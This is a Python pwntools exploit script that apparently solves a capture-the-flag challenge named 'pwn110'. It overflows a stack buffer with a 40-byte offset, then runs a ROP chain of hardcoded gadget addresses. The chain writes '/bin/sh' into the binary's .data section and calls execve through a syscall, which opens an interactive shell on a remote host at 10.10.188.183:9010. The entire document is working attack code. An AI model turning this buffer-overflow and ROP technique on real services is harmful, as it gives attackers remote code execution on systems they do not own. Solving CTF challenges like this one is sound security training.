#!/usr/bin/python3

from pwn import *

local = False
filename = './pwn110.pwn110'
hostname = '10.10.188.183'
port = 9010
is_debug = False
eip_offest = 40

e = ELF(filename)
mov_rdx_rax = 0x0000000000419748 # mov qword ptr [rdx], rax; ret;
mov_rsi_rax = 0x000000000047bcf5 # mov qword ptr [rsi], rax; ret;
pop_rdi = 0x000000000040191a # pop rdi; ret;
pop_rax = 0x00000000004497d7 # pop rax; ret;
pop_rsi = 0x000000000040f4de # pop rsi; ret;
pop_rdx = 0x000000000040181f # pop rdx; ret;
ret = 0x0000000000441409 # ret;
xor_rax = 0x0000000000443e30 # xor rax, rax; ret;
syscall = 0x00000000004173d4 # syscall; ret;
syscall_only = 0x00000000004012d3 # syscall;

'''
rw sections, pick one
19  0x000beef8     0xf0 0x004bfef8     0xf0 -rw- .got
20  0x000bf000     0xd8 0x004c0000     0xd8 -rw- .got.plt
21  0x000bf0e0   0x1a50 0x004c00e0   0x1a50 -rw- .data
22  0x000c0b30     0x48 0x004c1b30     0x48 -rw- libc_subfreeres
23  0x000c0b80    0x6a8 0x004c1b80    0x6a8 -rw- libc_IO_vtables
24  0x000c1228      0x8 0x004c2228      0x8 -rw- libc_atexit
25  0x000c1230      0x0 0x004c2240   0x1718 -rw- .bss
'''
rw_section = 0x004c00e0 # -rw- .data


if local:
    if is_debug:
        p = gdb.debug(filename, '''
        break *main+75
        continue
        ''')
    else:
        p = process(filename)
else:
    p = remote(hostname, port)

payload = b"A" * eip_offest
'''
put "/bin/sh" into rw_section
'''
payload += p64(pop_rdx)
payload += p64(rw_section)
payload += p64(xor_rax)
payload += p64(pop_rax)
payload += p64(0x68732f6e69622f)    # /bin/sh
payload += p64(mov_rdx_rax)
'''
https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

sys_execve
%rax                                ->  59
%rdi    const char *filename        ->  /bin/sh
%rsi    const char *const argv[]    ->  0
%rdx    const char *const envp[]    ->  0
''' 
payload += p64(pop_rdi)
payload += p64(rw_section)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

p.recvuntil(b"without libc")
p.recvline() # receive emoji
print('Sending payload...')
p.sendline(payload)
p.interactive()

